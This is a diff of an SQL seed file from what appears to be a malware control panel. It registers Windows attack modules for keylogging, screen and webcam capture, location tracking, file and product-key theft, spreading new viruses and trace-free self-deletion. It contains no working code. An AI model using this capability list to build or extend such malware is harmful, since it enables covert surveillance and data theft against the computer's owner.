@@ -77,103 +77,103 @@ CREATE TABLE IF NOT EXISTS packageInfo
 );
 
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
-VALUES ('Win.background.MonitorLocation',
+VALUES ('win.background.MonitorLocation',
         '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\Background\\MonitorLocation\\MonitorLocation',
         'Windows/Background/MonitorLocation',
         'easy.background.MonitorLocation',
         'Continuously monitors for the host computer\'s location');
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
-VALUES ('Win.background.MonitorScreen',
+VALUES ('win.background.MonitorScreen',
         '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\Background\\MonitorScreen\\MonitorScreen',
         'Windows/Background/MonitorScreen',
         'easy.background.MonitorScreen',
         'Continuously monitors the screen');
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
-VALUES ('Win.background.MonitorKeyboard',
+VALUES ('win.background.MonitorKeyboard',
         '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\Background\\MonitorKeyboard\\MonitorKeyboard',
         'Windows/Background/MonitorKeyboard',
         'easy.background.MonitorKeyboard',
         'Continuously monitors every keystrokes');
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
-VALUES ('Win.oneTime.ActivateSwarm',
+VALUES ('win.oneTime.ActivateSwarm',
         '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\ActivateSwarm\\ActivateSwarm',
         'Windows/OneTime/ActivateSwarm',
         'adv.ActivateSwarm',
         'Installs a more complex version of this virus that can fight back');
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
-VALUES ('Win.oneTime.CheckPermission',
+VALUES ('win.oneTime.CheckPermission',
         '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\CheckPermission\\CheckPermission',
         'Windows/OneTime/CheckPermission',
         'adv.CheckPermission',
         'Checks permission of a bunch of folders');
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
-VALUES ('Win.oneTime.CollectEnv',
+VALUES ('win.oneTime.CollectEnv',
         '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\CollectEnv\\CollectEnv',
         'Windows/OneTime/CollectEnv',
         'easy.CollectEnv',
         'Collects environmental variables, like JAVA_PATH, Path, UserDomain, etc.');
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
-VALUES ('Win.oneTime.CollectFile',
+VALUES ('win.oneTime.CollectFile',
         '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\CollectFile\\CollectFile',
         'Windows/OneTime/CollectFile',
         'easy.CollectFile',
         'Collects a bunch of files');
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
-VALUES ('Win.oneTime.ExecuteScript',
+VALUES ('win.oneTime.ExecuteScript',
         '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\ExecuteScript\\ExecuteScript',
         'Windows/OneTime/ExecuteScript',
         'adv.ExecuteScript',
         'Executes a custom script. This is discouraged, because the whole point of attack packages is to make sure the code runs well. Use this at your own risk as you might lose the virus to uncontrolled behavior.');
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
-VALUES ('Win.oneTime.ExploreDir',
+VALUES ('win.oneTime.ExploreDir',
         '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\ExploreDir\\ExploreDir',
         'Windows/OneTime/ExploreDir',
         'easy.ExploreDir',
         'Explores a particular directory.');
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
-VALUES ('Win.oneTime.NewVirus',
+VALUES ('win.oneTime.NewVirus',
         '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\NewVirus\\NewVirus',
         'Windows/OneTime/NewVirus',
         'easy.NewVirus',
         'Installs a new virus');
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
-VALUES ('Win.oneTime.Power',
+VALUES ('win.oneTime.Power',
         '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\Power\\Power',
         'Windows/OneTime/Power',
         'easy.Power',
         'Power-related operations: shutdown or restart');
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
-VALUES ('Win.oneTime.ScanPartitions',
+VALUES ('win.oneTime.ScanPartitions',
         '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\ScanPartitions\\ScanPartitions',
         'Windows/OneTime/ScanPartitions',
         'easy.ScanPartitions',
         'Scans for every available partitions on the target computer.');
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
-VALUES ('Win.oneTime.Screenshot',
+VALUES ('win.oneTime.Screenshot',
         '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\Screenshot\\Screenshot',
         'Windows/OneTime/Screenshot',
         'easy.Screenshot',
         'Takes a screenshot');
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
-VALUES ('Win.oneTime.SelfDestruct',
+VALUES ('win.oneTime.SelfDestruct',
         '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\SelfDestruct\\SelfDestruct',
         'Windows/OneTime/SelfDestruct',
         'easy.SelfDestruct',
         'Deletes the virus permanently, leaving no traces left.');
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
-VALUES ('Win.oneTime.SystemInfo',
+VALUES ('win.oneTime.SystemInfo',
         '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\SystemInfo\\SystemInfo',
         'Windows/OneTime/SystemInfo',
         'easy.SystemInfo',
         'Gets some basic system information.');
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
-VALUES ('Win.oneTime.ProductKey',
+VALUES ('win.oneTime.ProductKey',
         '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\ProductKey\\ProductKey',
         'Windows/OneTime/ProductKey',
         'easy.ProductKey',
         'Gets Windows product key');
 INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
-VALUES ('Win.oneTime.Webcam',
+VALUES ('win.oneTime.Webcam',
         '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\Webcam\\Webcam',
         'Windows/OneTime/Webcam',
         'easy.Webcam',
